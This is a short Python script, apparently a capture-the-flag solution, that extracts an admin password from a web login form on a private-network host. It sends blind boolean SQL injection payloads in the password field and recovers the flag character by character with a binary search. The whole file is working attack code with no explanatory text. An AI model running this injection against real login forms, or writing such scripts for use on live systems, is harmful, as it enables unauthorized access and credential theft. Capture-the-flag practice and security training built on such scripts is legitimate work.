import requests


REMOTE = "http://10.0.10.10:5002"
record = {"count": 0}

def char_is_above(index, guess):
    injection = "' OR (username='admin' AND unicode(substr(password, {index}, 1)) > {guess});-- "
    r = requests.post(REMOTE + "/",
                      data={"username": "admin",
                            "password": injection.format(index=index, guess=guess)})
    record["count"] += 1
    return r.status_code == 200

def brute_char(index):
    left = 0
    right = 127
    while True:
        guess = int((left + right) / 2)
        if left == right:
            return chr(guess)
        elif char_is_above(index, guess):
            left = guess + 1
        else:
            right = guess

flag = "595g{"
for _ in xrange(16):
    flag += brute_char(len(flag) + 1)
flag += "}"

print(record["count"])
print(flag)
